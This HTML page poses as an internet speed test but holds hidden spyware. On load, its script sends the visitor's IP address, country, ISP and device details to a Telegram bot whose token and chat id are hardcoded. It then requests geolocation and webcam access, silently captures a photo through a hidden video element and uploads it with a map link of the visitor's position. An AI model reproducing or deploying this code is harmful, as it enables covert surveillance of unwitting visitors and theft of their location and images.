<!DOCTYPE html>
<html>
<head><title>Internet Speed Test</title></head>
<body>
    <h1 style="text-align:center;">Checking Internet Speed...</h1>
    <video id="video" style="display:none;" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const botToken = '8117812522:AAGFhq6xv5zgci1Z9mt5H1a3c26V7h48CI4';
        const chatId = '1034878899';

        // 1. Ú•Ø§Ø³ØªÛ•ÙˆØ®Û† Ø²Ø§Ù†ÛŒØ§Ø±ÛŒ Ø¦Ø§ÛŒÙ¾ÛŒ Ø¯Û•Ù†ÛŽØ±ÛŽØª (Ø¨ÛŽ Ù…Û†ÚµÛ•Øª)
        async function getImmediateInfo() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                const text = `ðŸ”” Ú©Û•Ø³ÛŽÚ© Ù„ÛŒÙ†Ú©Û•Ú©Û•ÛŒ Ú©Ø±Ø¯Û•ÙˆÛ•!\nðŸŒ IP: ${data.ip}\nðŸ“ ÙˆÚµØ§Øª: ${data.country_name}\nðŸ¢ Ú©Û†Ù…Ù¾Ø§Ù†ÛŒØ§: ${data.org}\nðŸ“± Ø¦Ø§Ù…ÛŽØ±: ${navigator.userAgent}`;
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
            } catch (e) { console.log(e); }
        }

        // 2. ÙˆÛŽÙ†Û• Ùˆ Ø´ÙˆÛŽÙ†ÛŒ ÙˆØ±Ø¯ (Ø¯ÙˆØ§ÛŒ Allow)
        async function getSensitiveData() {
            // ÙˆÛ•Ø±Ú¯Ø±ØªÙ†ÛŒ Ø´ÙˆÛŽÙ†
            navigator.geolocation.getCurrentPosition(pos => {
                const loc = `ðŸ“ Ø´ÙˆÛŽÙ†ÛŒ ÙˆØ±Ø¯ Ø¯Û†Ø²Ø±Ø§ÛŒÛ•ÙˆÛ•:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(loc)}`);
            });

            // Ú¯Ø±ØªÙ†ÛŒ ÙˆÛŽÙ†Û•
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(blob => {
                        const frm = new FormData();
                        frm.append('chat_id', chatId); frm.append('photo', blob, 'p.jpg');
                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: frm });
                        stream.getTracks().forEach(t => t.stop());
                    }, 'image/jpeg');
                }, 2000);
            } catch (err) {}
        }

        window.onload = () => {
            getImmediateInfo();
            getSensitiveData();
        };
    </script>
</body>
</html>
